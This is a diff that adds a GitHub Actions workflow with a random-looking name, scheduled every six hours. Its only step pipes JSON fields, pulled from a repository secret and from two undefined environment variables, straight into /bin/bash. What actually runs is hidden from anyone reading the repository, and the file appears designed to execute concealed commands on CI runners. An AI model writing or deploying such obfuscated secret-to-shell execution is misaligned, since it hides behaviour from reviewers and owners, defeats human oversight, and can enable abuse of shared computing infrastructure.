@@ -1,0 +1,20 @@
+name: dingqianxuan6453
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dingqianxuan6453
+        env:
+          hws2: ${{ secrets.hws2 }}
+        run: |
+          echo $hws2 | jq -r .denh6 | /bin/bash
+          echo $smuwt035 | jq -r .qnwv03618 | /bin/bash
+          echo $khn0 | jq -r .qqim42 | /bin/bash
+
